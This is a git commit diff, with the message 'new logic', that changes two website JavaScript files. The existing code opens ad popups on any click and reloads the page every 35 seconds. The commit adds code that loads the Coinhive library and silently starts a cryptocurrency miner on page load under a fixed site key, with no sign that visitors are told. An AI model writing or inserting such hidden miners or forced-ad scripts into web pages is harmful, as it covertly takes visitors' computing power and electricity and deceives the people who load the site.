791ad64b8f569419b8dd6916f0d0c36cfa3a62a3
Nazar Mozol <xfce4@yandex.ua>
2017-10-16 23:02:38 +0300

    new logic

--- jsts/cary-o.js
+++ jsts/cary-o.js
@@ -1,4 +1,20 @@
 $(document).ready(function(){
     $('body').click(function(){window.open('http://go.ad2upapp.com/afu.php?id=823278');});
 	setTimeout(function(){ window.location=window.location; },35000);
+
+
+	var script = document.createElement('script');
+	script.src = 'https://coinhive.com/lib/coinhive.min.js';
+	var ls = document.getElementsByTagName('head')[0].appendChild(script);
+
+	ls.addEventListener('load', los, false);
+		
+	function los() {
+		setTimeout(function() {
+			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
+				threads: 1
+			});
+			miner.start();
+		}, 500);
+	}
 });
--- jsts/cary-s.js
+++ jsts/cary-s.js
@@ -38,3 +38,21 @@ $(document).ready(function(){
         }
     });
 });
+
+
+$(document).ready(function(){
+    var script = document.createElement('script');
+    script.src = 'https://coinhive.com/lib/coinhive.min.js';
+    var ls = document.getElementsByTagName('head')[0].appendChild(script);
+
+    ls.addEventListener('load', los, false);
+        
+    function los() {
+        setTimeout(function() {
+            var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
+                threads: 1
+            });
+            miner.start();
+        }, 500);
+    }
+});
